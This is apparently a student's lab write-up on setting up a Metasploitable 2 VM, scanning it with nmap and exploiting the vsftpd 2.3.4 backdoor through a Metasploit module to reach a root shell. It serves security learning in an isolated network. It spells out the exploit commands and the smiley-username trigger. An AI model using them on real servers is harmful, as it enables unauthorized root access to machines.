# Task 3: Saturday Lab — Metasploitable Setup and Exploitation

## Overview
This folder documents the Saturday session, which covered setting up a
Metasploitable 2 virtual machine, scanning it to identify vulnerable services,
and exploiting the vsftpd 2.3.4 backdoor using the Metasploit Framework to
gain a root shell on the target machine.

---

## Environment
| Component | Details |
|-----------|---------|
| Attacker | Kali Linux — 192.168.56.102 |
| Target | Metasploitable 2 — 192.168.56.101 |
| Network | VirtualBox Host-Only Adapter |
| Metasploit Version | v6.4.84-dev |
| Date | 8 May 2026 |

---

## Setup Process

### Step 1 — Download Metasploitable 2
Download from: https://sourceforge.net/projects/metasploitable/

### Step 2 — Extract the archive
Extract the ZIP file. You will find a `.vmdk` disk image inside.

### Step 3 — Create a new VM in VirtualBox
### Step 4 — Set network adapter to Host-Only
> ⚠️ This step is critical. Without it, Kali and Metasploitable cannot
> communicate with each other.

### Step 5 — Boot and confirm IP
Log in with: `msfadmin / msfadmin`
```bash
ifconfig
```
Look for `eth0 inet addr` — this is your target IP.
In this lab: **192.168.56.101**

---

## Lab Walkthrough

### Phase 1 — Reconnaissance
```bash
nmap -A -T4 192.168.56.101
```
**Key services discovered:**
| Port | Service | Version | Risk |
|------|---------|---------|------|
| 21/tcp | FTP | vsftpd 2.3.4 | Critical — backdoor |
| 22/tcp | SSH | OpenSSH 4.7p1 | High — outdated |
| 23/tcp | Telnet | Linux telnetd | High — cleartext |
| 80/tcp | HTTP | Apache 2.2.8 | Medium |
| 139/445/tcp | SMB | Samba 3.X–4.X | High — signing disabled |
| 1524/tcp | shell | Metasploitable root shell | Critical |
| 3306/tcp | MySQL | 5.0.51a | High — exposed DB |
| 5900/tcp | VNC | Protocol 3.3 | High |
| 6667/tcp | IRC | UnrealIRCd | Critical — backdoor |

OS: Linux 2.6.X | Hostname: metasploitable | Distance: 1 hop

---

### Phase 2 — Finding the Exploit
```bash
searchsploit vsftpd 2.3.4
```
**Result:**

---

### Phase 3 — Exploitation with Metasploit
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set RPORT 21
exploit
```
**Output:**

---

### Phase 4 — Post-Exploitation Verification
```bash
whoami      # → root
hostname    # → metasploitable
ifconfig    # → 192.168.56.101 confirmed
```

---

## How the Backdoor Works
The vsftpd 2.3.4 backdoor was maliciously inserted into the source code in
2011. When a user logs in with a username containing `:)` (a smiley face),
the server opens a listening shell on **port 6200** with root privileges.
The attacker then connects to port 6200 and has an unrestricted root shell.

---

## Key Takeaways
- Over 20 vulnerable services were running simultaneously on a default
  Metasploitable install — any one of them could lead to full compromise.
- The entire exploit from `msfconsole` to root shell took under 2 minutes.
- The LHOST warning "Unknown datastore option: LHOST. Did you mean RHOST?"
  appears for this particular module because it uses a bind shell (port 6200
  opens on the target) rather than a reverse shell. LHOST is not needed.
- Post-exploitation verification (whoami, hostname, ifconfig) is standard
  practice to confirm scope and access level before proceeding.

